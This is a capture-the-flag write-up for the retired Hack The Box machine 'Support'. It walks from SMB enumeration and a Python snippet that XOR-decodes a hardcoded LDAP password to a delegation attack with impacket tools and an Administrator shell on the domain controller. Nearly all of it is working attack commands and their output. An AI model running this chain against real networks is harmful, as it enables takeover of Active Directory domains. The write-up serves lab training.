# Support

> Retired Hack The Box machine. Public copy with flags removed. Authorized lab use only.

Step 1: Nmap

```
Command: nmap -A --top-port 10000 10.129.7.133 --min-rate 1000
```

```
Output:

Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 12:32 -0400
Nmap scan report for 10.129.7.133
Host is up (0.060s latency).
Not shown: 8368 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-20T16:33:20
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 12s

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   59.97 ms 10.10.14.1
2   62.35 ms 10.129.7.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.72 seconds
```

Step 2: Show shares via smb

```
Command: smbclient -L //10.129.7.133
```

```
Output:

Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
```

Find interesting folder, support-tools is a custom folder that create, other are all the default.

Step 3: Login via support-tools

```
Command: smbclinet //10.129.7.133/support-tools
```

```
Output:

smb: \> dir
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
```

```
get UserInfo.exe.zip and extract it
```

Step 4: Find all readable strings

```
Command: strings -e l UserInfo.exe | grep -v " " | grep -v "^[A-Z]" | grep -v "\." | head -40          
@%1; 
```

```
Output:

0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
armando
support\ldap
(givenName=
(sn=
(&(givenName=
)(sn=
sAMAccountName
sAMAccountName=
pwdLastSet
lastLogon
givenName
mail
find
user
000004b0

```

We can found the key and xor key with the readable strings

Step 5: Crack the password with the key

```
import base64

enc = base64.b64decode('0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E')
key = 'armando'

# Try XOR with key + constant 0xdf (223)
result = ''
for i, b in enumerate(enc):
    result += chr(b ^ ord(key[i % len(key)]) ^ 0xdf)
print('key_found:', result)
```

```
Found the key: 

nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Step 6: Dump all info with ldap

```
Command: ldapsearch -x -H ldap://DC01.support.htb   -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'   -b "DC=support,DC=htb" "(sAMAccountName=support)"
```

```
Output:

xPWO1%lmz'   -b "DC=support,DC=htb"   "(sAMAccountName=support)"
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (sAMAccountName=support)
# requesting: ALL
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20260320172424.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 90213
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 134185010305072071
lastLogoff: 0
lastLogon: 134185010648666568
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 134185010648666568

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```

```
And found the password: 

info: Ironside47pleasure40Watchful
```

Step 7: Login to user support via winrm

Get user flag

```
evil-winrm -i 10.129.7.133 -u support -p 'Ironside47pleasure40Watchful'
```

```
Output:

*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
[user flag removed]
*Evil-WinRM* PS C:\Users\support\Desktop> 

```

Step 8:

Get data from bloodhound

```
Command: bloodhound-python -u support \
  -p 'Ironside47pleasure40Watchful' \
  -d support.htb \
  -ns 10.129.7.133 \
  -c All
```


And found the user has permission: GenericAll

```
## `GenericAll` Privilege

In BloodHound, the `support` user has **`GenericAll`** on the `DC.SUPPORT.HTB` computer object.

---

**What GenericAll means:**

Privilege: GenericAll
Meaning: Full control over the object — the highest possible permission
```

Step 9: Create a fake computer account

```
Command: impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
  -computer-name 'FAKE$' \
  -computer-pass 'FakePass123!'
```

```
Output:

[*] Successfully added machine account FAKE$ with password FakePass123!.

```


Step 10: Set RBCD - allow FAKE$ to delegate to DC

```
Command: impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' \
  -delegate-from 'FAKE$' \
  -delegate-to 'DC$' \
  -action write
```

```
Output:

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKE$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FAKE$        (S-1-5-21-1677581083-3380853377-188903654-6101)
```


Step 11: Get a service ticket impersonating Administrator

```
Command: impacket-getST support.htb/'FAKE$':'FakePass123!' \                                           
  -spn cifs/DC.support.htb \
  -impersonate Administrator
```

```
Output: 

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```

Step 12: Access to Administrator

```
export KRB5CCNAME= Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
impacket-psexec -k -no-pass support.htb/Administrator@DC.support.htb
```

Found the root flag

```
C:\Users\Administrator\Desktop> type root.txt
[root flag removed]

C:\Users\Administrator\Desktop> 

```
